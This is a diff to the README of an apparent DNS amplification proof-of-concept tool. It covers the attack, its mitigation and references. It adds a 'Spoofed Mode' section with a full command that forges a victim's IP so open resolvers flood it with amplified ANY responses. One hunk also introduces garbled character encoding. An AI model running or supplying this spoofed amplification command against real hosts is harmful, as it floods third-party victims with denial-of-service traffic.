@@ -20,7 +20,7 @@ to overwhelm a target server or network with an amplified amount of traffic, ren
 
 ## Is possible to mitigate a DNS amplification attack?
 Yes, mitigation options are limited due to the high amount of traffic generated, the Internet Service Provider (ISP) or other upstream infrastructure providers may not
-be able to handle the incoming traffic without becoming overwhelmed. As a result, the ISP may blackhole all traffic to the targeted victim’s IP address.
+be able to handle the incoming traffic without becoming overwhelmed. As a result, the ISP may blackhole all traffic to the targeted victimâ€™s IP address.
 
 ## References:
 - https://www.cloudflare.com/learning/ddos/dns-amplification-ddos-attack/
@@ -61,3 +61,14 @@ Here's an example of how you might use this parameter in the script:
 Loved the project? You can buy me a coffee
 
 <a href="https://www.buymeacoffee.com/r3vskd" target="_blank"><img src="https://cdn.buymeacoffee.com/buttons/default-orange.png" alt="Buy Me A Coffee" height="41" width="174"></a>
+
+## Spoofed Mode (pentest -- requires root)
+
+Sends DNS queries with the victim IP forged as the source.
+Resolvers send amplified responses directly to the victim.
+
+```
+sudo python ./poc.py -d example.com -f resolvers.txt -p 53 --spoof --victim 192.168.1.100 --victim_port 53 --qtype ANY --edns_payload 4096 --burst -v
+```
+
+> Requires root/administrator. Linux only (Windows kernel blocks raw socket IP spoofing).
